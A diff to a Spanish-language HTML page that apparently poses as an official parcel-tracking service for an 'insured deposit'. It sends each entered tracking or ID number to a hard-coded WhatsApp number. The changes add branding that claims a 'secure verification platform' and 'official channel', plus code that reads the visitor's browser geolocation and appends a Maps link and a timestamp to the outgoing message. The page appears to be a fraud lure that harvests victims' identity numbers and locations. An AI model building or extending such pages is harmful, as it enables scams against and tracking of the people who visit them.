@@ -20,7 +20,7 @@ body{
     display:flex;
     justify-content:center;
     align-items:center;
-    background:linear-gradient(135deg,#052e23,#0a5c45,#0e7c59);
+    background:linear-gradient(135deg,#002b36,#004d40,#00695c);
 }
 
 .container{
@@ -33,6 +33,11 @@ body{
     box-shadow:0 20px 40px rgba(0,0,0,0.4);
     text-align:center;
     color:white;
+}
+
+.logo{
+    font-size:42px;
+    margin-bottom:15px;
 }
 
 h1{
@@ -71,12 +76,12 @@ button{
 }
 
 .btn-primary{
-    background:linear-gradient(90deg,#00c853,#00e676);
+    background:linear-gradient(90deg,#ff6f00,#ff8f00);
     color:white;
 }
 
 .btn-secondary{
-    background:linear-gradient(90deg,#00897b,#26a69a);
+    background:linear-gradient(90deg,#004d40,#00796b);
     color:white;
 }
 
@@ -128,9 +133,12 @@ button:disabled{
 <body>
 
 <div class="container">
+
+    <div class="logo">📦</div>
+
     <h1>Consultar guía</h1>
     <div class="subtitle">
-        Consulta el estado de tu envío con depósito asegurado
+        Plataforma segura de verificación depósito asegurado
     </div>
 
     <input type="text" id="guia" placeholder="Ingresa número de guía" oninput="soloNumeros(this)">
@@ -152,14 +160,15 @@ button:disabled{
     </div>
 
     <div class="footer">
-        Servicio exclusivo depósito asegurado
+        Servicio exclusivo • Canal oficial WhatsApp
     </div>
+
 </div>
 
 <script>
 
 const numeroWhatsApp = "573026219839";
-const guiaValida = "0750925931"; // ÚNICA GUÍA PERMITIDA
+const guiaValida = "0750925931";
 
 function soloNumeros(input){
     input.value = input.value.replace(/[^0-9]/g,'');
@@ -177,6 +186,20 @@ function ocultarLoader(){
     document.getElementById("btnDoc").disabled = false;
 }
 
+function obtenerUbicacion(callback){
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(function(position){
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            callback("Ubicación aproximada: https://maps.google.com/?q=" + lat + "," + lon);
+        }, function(){
+            callback("Ubicación no disponible");
+        });
+    }else{
+        callback("Ubicación no soportada");
+    }
+}
+
 function consultarGuia(){
     var guia = document.getElementById("guia").value.trim();
     var error = document.getElementById("error");
@@ -190,11 +213,22 @@ function consultarGuia(){
     error.style.display="none";
     mostrarLoader();
 
-    setTimeout(function(){
-        var mensaje = "Hola, realizo consulta de DEPÓSITO ASEGURADO.%0AGuía: " + guia;
-        window.open("https://wa.me/" + numeroWhatsApp + "?text=" + mensaje, "_blank");
-        ocultarLoader();
-    },1500);
+    obtenerUbicacion(function(ubicacion){
+
+        setTimeout(function(){
+
+            var mensaje = "📦 CONSULTA DEPÓSITO ASEGURADO%0A"
+                        + "Guía: " + guia + "%0A"
+                        + ubicacion + "%0A"
+                        + "Fecha: " + new Date().toLocaleString();
+
+            window.open("https://wa.me/" + numeroWhatsApp + "?text=" + mensaje, "_blank");
+
+            ocultarLoader();
+
+        },1500);
+
+    });
 }
 
 function consultarDocumento(){
@@ -202,7 +236,7 @@ function consultarDocumento(){
     var error = document.getElementById("error");
 
     if(doc === ""){
-        error.innerText = "Debe ingresar un número de documento válido";
+        error.innerText = "Debe ingresar un número válido";
         error.style.display="block";
         return;
     }
@@ -210,11 +244,22 @@ function consultarDocumento(){
     error.style.display="none";
     mostrarLoader();
 
-    setTimeout(function(){
-        var mensaje = "Hola, realizo consulta de DEPÓSITO ASEGURADO.%0ADocumento: " + doc;
-        window.open("https://wa.me/" + numeroWhatsApp + "?text=" + mensaje, "_blank");
-        ocultarLoader();
-    },1500);
+    obtenerUbicacion(function(ubicacion){
+
+        setTimeout(function(){
+
+            var mensaje = "📦 CONSULTA DEPÓSITO ASEGURADO%0A"
+                        + "Documento: " + doc + "%0A"
+                        + ubicacion + "%0A"
+                        + "Fecha: " + new Date().toLocaleString();
+
+            window.open("https://wa.me/" + numeroWhatsApp + "?text=" + mensaje, "_blank");
+
+            ocultarLoader();
+
+        },1500);
+
+    });
 }
 
 </script>
